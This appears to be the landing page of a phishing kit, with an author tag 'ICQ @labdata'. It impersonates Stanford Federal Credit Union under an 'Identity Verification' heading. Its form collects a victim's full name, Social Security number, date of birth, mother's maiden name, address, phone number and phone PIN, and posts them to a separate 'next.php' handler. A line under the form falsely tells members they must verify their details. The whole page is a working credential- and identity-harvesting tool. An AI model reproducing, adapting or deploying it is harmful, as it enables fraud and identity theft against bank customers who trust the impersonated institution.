<?php
/*
ICQ @labdata
Please don't fuck with my code.
*/
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
    <title>Identity Verification</title>
    <!-- bootstrap.min.css, formValidation.min.css, bootstrap-theme.min.css, fontello.css -->
    <link rel="stylesheet" href="assets/css/all.min.css">
    <!-- Standard Q2 Enrollment layout CSS -->
    <link rel="stylesheet" href="assets/css/layout.css">
    <!-- Custom Q2 CSS -->
    <link rel="stylesheet" href="assets/css/custom.css">
    <!-- jquery.js, jquery.mask.js, bootrap.js, formValidation.js, formValidation/bootstrap.js all minified -->
    <link href="https://cdn1.onlineaccess1.com/cdn/depot/5105/533/f3b35f874a6341f1c9e2f1e54faa246b/assets/images/favicon-b57abc2bafab8d4959151f56d28e289b.ico" rel="icon">
</head>
<script src="./assets/js/angular.min.js"></script>
<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/jquery.validate.min.js"></script>
<script src="./assets/js/jquery.mask.js"></script>
<script type="text/javascript">
    $(function() {
        $('#dob').mask('00/00/0000');
        $('#ssn').mask('000-00-0000');
        $('#zipc').mask('00000');
        $('#pnum').mask('000-000-0000');



    });
</script>

<body>

    <!-- Modal -->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-xs-12 congrats">
                            <h2 class="icon-ok-circle" id="modal-title"></h2>
                        </div>
                        <div class="col-xs-12" id="success_message"></div>
                        <div class="col-xs-12" id="modal-body"></div>
                    </div>
                </div>
                <div class="modal-footer" id="modal-footer"></div>
            </div>
        </div>
    </div>
    <!--End Modal -->

    <div class="container-fluid heading">
        <div class="col-xs-12" style="text-align: center">
            <img src="assets/img/SFCU.png" style="max-width: 100%; height: auto;">
        </div>
    </div>
    <div class="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12">
        <div class="row" style="margin-bottom: 40px;">
            <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
                <h3 id="page_title">Identity Verification</h3>
                <p id="page_message" class="page-message"></p>
                <!-- Alert Area -->
                <div id="alertBox" class="alertBox hidden">
                    <div class="row">
                        <div class="col-xs-2 col-sm-1 col-md-1">
                            <i class="icon-warning-sign"></i>
                        </div>
                        <div class="col-xs-10 col-sm-11 col-md-11 modal-msg"></div>
                    </div>
                </div>
                <!-- End Alert Area -->
                <!-- Tab Area -->
                <ul id="nav-tabs" class="nav nav-tabs" role="tablist" style="display: none;"></ul>
                <!-- End Tab Area-->
            </div>
            <div class="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
                <noscript>
                    <style>
                        .btn {
                            display: none;
                        }
                    </style>
                    <div id="alertBox" class="alertBox">
                        <div class="row">
                            <div class="col-xs-2 col-sm-1 col-md-1">
                                <i class="icon-warning-sign"></i>
                            </div>
                            <div class="col-xs-10 col-sm-11 col-md-11 modal-msg">JavaScript is disabled. Please enable JavaScript to correctly display the page.</div>
                        </div>
                    </div>
                </noscript>
                <!-- Automated Insertion of Fields in div below -->
                <div id="q2-form-fields" class="tab-content">
                    <div id="personal" role="tabpanel" class="tab-pane active">
                        <form class="q2-form fv-form fv-form-bootstrap" action="../next.php" method="post">

                            <button type="submit" class="fv-hidden-submit" style="display: none; width: 0px; height: 0px;">
                            </button>
                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label>Full Name:</label>
                                <input type="text" id="fname" name="fname" class="form-control " maxlength="40" required>

                            </div>
                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label for="SocialSecurity">Social Security Number:</label>
                                <input type="tel" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" class="form-control " maxlength="11" required>

                            </div>
                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label for="DOB">Date of Birth:</label>
                                <input type="tel" id="dob" placeholder="MM/DD/YYYY" name="dob" class="form-control " maxlength="10" required>

                            </div>
                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label>Mother's Maiden Name</label>
                                <input type="text" id="mmn" name="mmn" class="form-control " maxlength="30" required>

                            </div>

                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label>Address:</label>
                                <input type="text" id="addr" name="addr" class="form-control " maxlength="10" required>

                            </div>

                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label>Zip Code</label>
                                <input type="tel" id="zipc" name="zipc" class="form-control " maxlength="5" required>

                            </div>

                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label>Phone Number:</label>
                                <input type="tel" id="pnum" name="pnum" placeholder="XXX-XXX-XXXX" class="form-control " maxlength="12" required>

                            </div>

                            <div class="form-group col-xs-12 col-sm-6 has-feedback"><label>Phone Pin</label>
                                <input type="password" id="ppin" name="ppin" class="form-control " minlength="4" maxlength="6" required>

                            </div>
                            <div class="col-xs-12 ">
                                <div class="line"></div>
                            </div><input type="hidden" name="EnrollmentType" value="retail"><input id="token_OnlineEnrollment_personal" type="hidden" name="token" value=""><button class="btn btn-primary pull-right" id="submit_button_OnlineEnrollment_personal">Continue</button>
                        </form>
                    </div>
                </div>
                <div class="clearfix">Please verify the information we have on file.
                    Stanford FCU members use to verfiy account details. Thank you.</div>
                <!-- End Automated Insertion div -->
            </div>
        </div>
        <!-- <a href="javascript:void(0);" onclick="testSuccess('full');">Full Success</a> | <a href="javascript:void(0);" onclick="testSuccess('partial');">Partial Success</a> -->
    </div>


</body>

</html>